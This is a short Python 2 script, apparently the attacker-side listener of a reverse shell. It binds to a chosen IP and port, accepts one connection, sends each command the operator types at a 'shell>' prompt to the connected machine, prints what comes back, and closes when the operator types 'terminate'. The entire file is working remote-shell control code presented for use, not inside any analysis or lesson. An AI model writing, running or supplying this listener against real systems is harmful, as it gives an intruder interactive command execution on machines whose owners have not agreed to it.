#!/usr/bin/env python

import socket
import subprocess
import sys

if len(sys.argv) <=2:
 print "Usage python server_tcp_shell.py <ipaddress> <port>"
 exit()

nbytes = 4096

def tcp_shell_server():

 host = sys.argv[1]
 port = int(sys.argv[2])
 socket_object = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 socket_object.bind((host, port))
 socket_object.listen(1)
 print '[+] Listening for incomming TCP on port'
 conn, addr = socket_object.accept()
 print '[+] We got a connection:', addr
 while True:
  command = raw_input("shell>")
  if 'terminate' in command:
   conn.send('terminate')
   conn.close()
   break
  else:
   conn.send(command)
   print conn.recv(nbytes)

tcp_shell_server()
